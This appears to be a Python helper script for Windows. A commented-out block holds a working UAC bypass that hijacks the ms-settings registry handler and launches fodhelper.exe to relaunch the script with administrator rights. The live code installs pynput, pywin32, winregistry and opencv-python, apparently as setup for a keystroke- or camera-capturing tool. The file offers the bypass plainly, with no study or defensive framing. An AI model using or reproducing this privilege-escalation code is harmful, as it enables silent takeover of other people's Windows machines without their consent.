# import os, sys, ctypes, winreg
# from sys import argv

# CMD                   = r"C:\Windows\System32\cmd.exe"
# FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
# REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
# DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
# def is_running_as_admin():
#     try:
#         return ctypes.windll.shell32.IsUserAnAdmin()
#     except:
#         return False

# def create_reg_key(key, value):
#     try:        
#         winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
#         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)              
#         winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
#         winreg.CloseKey(registry_key)
#     except WindowsError:        
#         raise

# def bypass_uac(cmd):
#     try:
#         create_reg_key(DELEGATE_EXEC_REG_KEY, '')
#         create_reg_key(None, cmd)    
#     except WindowsError:
#         raise

# def execute():
#     if not is_running_as_admin():
#         print('[!] The script is NOT running with administrative privileges')
#         print('[+] Trying to bypass the UAC')
#         try:                
#             current_file = '"' + os.getcwd() + '\\' + argv[0].split("\\")[-1] + '"'
#             cmd = 'C:\Windows\System32\cmd.exe /k' + current_file
#             bypass_uac(cmd)
#             os.system(FOD_HELPER)                
#             sys.exit(0)
#         except WindowsError:
#             sys.exit(1)
#     else:
#         print('[+] The script is running with administrative privileges!')   

# if __name__ == '__main__':
#     execute()

from subprocess import getoutput

modules = ['pynput', 'pywin32', 'winregistry', 'opencv-python']

for i in range(len(modules)):
    install = getoutput('pip install ' + modules[i])
    if install.lower().find('successfully') != -1:
        print('Installed ' + modules[i])
    elif install.find('ERROR') != -1:
        print('Module ' + modules[i] + ' not found')

    elif install.find('satisfied') != -1:
        print(modules[i] + ' is already installed')
        
print('\n', getoutput('pip list'))
input('')
